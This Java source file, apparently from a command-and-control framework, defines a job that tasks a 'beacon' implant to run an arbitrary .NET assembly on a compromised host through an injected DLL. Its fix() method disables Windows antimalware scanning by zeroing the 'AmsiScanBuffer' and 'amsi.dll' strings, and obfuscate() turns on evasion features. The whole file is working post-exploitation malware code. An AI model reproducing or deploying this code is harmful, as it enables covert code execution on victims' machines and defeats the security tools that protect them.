package beacon.jobs;

import beacon.JobSimple;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;

import java.io.File;

import pe.PostExObfuscator;

public class ExecuteAssemblyJob extends JobSimple {
    protected String file;

    protected String args;

    protected String arch;

    public ExecuteAssemblyJob(TaskBeacon taskBeacon, String string1, String string2, String string3) {
        super(taskBeacon);
        this.file = string1;
        this.args = string2;
        this.arch = string3;
    }

    public String getDescription() {
        return (this.args.length() > 0) ? ("Tasked beacon to run .NET program: " + (new File(this.file)).getName() + " " + this.args) : ("Tasked beacon to run .NET program: " + (new File(this.file)).getName());
    }

    public boolean ignoreToken() {
        return false;
    }

    public String getShortDescription() {
        return ".NET assembly";
    }

    public String getDLLName() {
        return this.arch.equals("x86") ? "resources/invokeassembly.dll" : "resources/invokeassembly.x64.dll";
    }

    public int getWaitTime() {
        return 20000;
    }

    public byte[] getArgument() {
        byte[] arrby = CommonUtils.readFile(this.file);
        Packer packer = new Packer();
        packer.addInt(arrby.length);
        packer.append(arrby);
        packer.addWideString(this.args + Character.MIN_VALUE);
        return packer.getBytes();
    }

    public byte[] fix(byte[] arrby) {
        if (!this.tasker.disableAMSI())
            arrby = CommonUtils.zeroOut(arrby, new String[]{"AmsiScanBuffer", "amsi.dll"});
        return arrby;
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
